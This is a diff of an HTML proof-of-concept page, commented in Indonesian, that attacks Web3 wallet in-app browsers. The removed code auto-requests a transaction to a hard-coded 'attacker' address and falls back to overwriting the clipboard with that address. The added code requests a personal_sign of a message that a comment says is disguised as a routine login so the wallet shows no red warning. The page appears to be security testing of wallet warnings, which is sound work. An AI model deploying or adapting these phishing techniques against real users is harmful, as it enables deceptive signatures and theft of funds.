@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web3 In-App Browser Security Sandbox</title>
+    <title>Web3 Sign Security Sandbox</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
@@ -69,13 +69,10 @@
 <body>
 
 <div class="card">
-    <h2>Web3 DApp Integration PoC</h2>
-    <p>Uji Coba Otomasi Direct-Call & Pemanggilan Provider Dompet</p>
-    
-    <!-- Input tersembunyi yang langsung fokus untuk mensimulasikan injeksi data langsung tanpa paste manual -->
-    <input type="text" id="targetInput" style="position: absolute; left: -9999px;" value="0x1111111111111111111111111111111111111111">
+    <h2>Web3 Sign Validation PoC</h2>
+    <p>Uji Coba Penandatanganan Pesan (personal_sign)</p>
 
-    <button class="btn" id="exploitBtn">Mulai Eksploitasi Otomatis</button>
+    <button class="btn" id="exploitBtn">Uji personal_sign Otomatis</button>
     
     <div id="statusBox" class="status-box">Status: Menunggu interaksi pemicu...</div>
 </div>
@@ -88,66 +85,46 @@
         statusBox.className = 'status-box ' + type;
     }
 
-    async function executeRealPoC() {
+    async function executeSignPoC() {
         try {
-            updateStatus("Memeriksa injeksi provider dApp...", "");
+            updateStatus("Memeriksa provider ethereum...", "");
 
-            // 1. Cek apakah injected provider tersedia (window.ethereum atau provider spesifik 1inch wallet)
             let provider = window.ethereum;
-            
             if (!provider && window.web3 && window.web3.currentProvider) {
                 provider = window.web3.currentProvider;
             }
 
-            if (provider) {
-                updateStatus("Provider terdeteksi! Meminta koneksi akun...", "");
-                
-                // Meminta akses akun secara langsung untuk memicu prompt
-                const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                updateStatus("Akun terhubung: " + accounts[0].substring(0,6) + "...", "");
-
-                // Simulasi memicu transaksi langsung ke alamat attacker tanpa interaksi user mengetik/paste
-                const attackerAddress = "0x8888888888888888888888888888888888888888";
-                const transactionParameters = {
-                    to: attackerAddress,
-                    from: accounts[0],
-                    value: '0x00', // 0 ETH/Wei test
-                    data: '0x'
-                };
-
-                updateStatus("Mengirim request transaksi otomatis...", "");
-                
-                // Memanggil method kirim transaksi langsung (ini akan memunculkan popup konfirmasi asli dompet secara otomatis)
-                const txHash = await provider.request({
-                    method: 'eth_sendTransaction',
-                    params: [transactionParameters],
-                });
-
-                updateStatus("Berhasil! TX Hash: " + txHash, "success");
-
-            } else {
-                // Jika tidak ada injected ethereum provider, fallback ke manipulasi deep-link scheme / auto-trigger dompet
-                updateStatus("Memicu manipulasi URI/Intent Scheme...", "");
-                
-                // Mencoba menulis ke clipboard DAN memaksa navigasi intent jika didukung WebView
-                await navigator.clipboard.writeText("0x8888888888888888888888888888888888888888");
-                
-                // Simulasi auto-click event / element focus dispatch
-                const input = document.getElementById('targetInput');
-                input.focus();
-                input.select();
-                
-                updateStatus("Clipboard tertulis & DOM terfokus otomatis (Zero-Paste Trigger).", "success");
+            if (!provider) {
+                updateStatus("Error: Provider tidak ditemukan di WebView.", "error");
+                return;
             }
 
+            updateStatus("Meminta koneksi akun...", "");
+            const accounts = await provider.request({ method: 'eth_requestAccounts' });
+            
+            // Payload pesan yang disamarkan agar terlihat seperti verifikasi login biasa (menghindari kecurigaan UI warning)
+            const message = "Verifikasi Sesi Keamanan DApp: Masuklah untuk melanjutkan sinkronisasi dompet aman.";
+            const msgHex = "0x" + Array.from(new TextEncoder().encode(message))
+                .map(b => b.toString(16).padStart(2, '0'))
+                .join('');
+
+            updateStatus("Mengirim request personal_sign...", "");
+
+            // Menguji apakah personal_sign lolos dari peringatan ancaman merah
+            const signature = await provider.request({
+                method: 'personal_sign',
+                params: [msgHex, accounts[0]],
+            });
+
+            updateStatus("Berhasil Ditandatangani! Sig: " + signature.substring(0, 15) + "...", "success");
+
         } catch (error) {
-            updateStatus("Gagal/Ditolak: " + (error.message || error), "error");
+            updateStatus("Ditolak/Gagal: " + (error.message || error), "error");
             console.error(error);
         }
     }
 
-    // Mengikat ke tombol klik (atau otomatis dijalankan jika browser/webview mengizinkan auto-trigger)
-    document.getElementById('exploitBtn').addEventListener('click', executeRealPoC);
+    document.getElementById('exploitBtn').addEventListener('click', executeSignPoC);
 </script>
 
 </body>
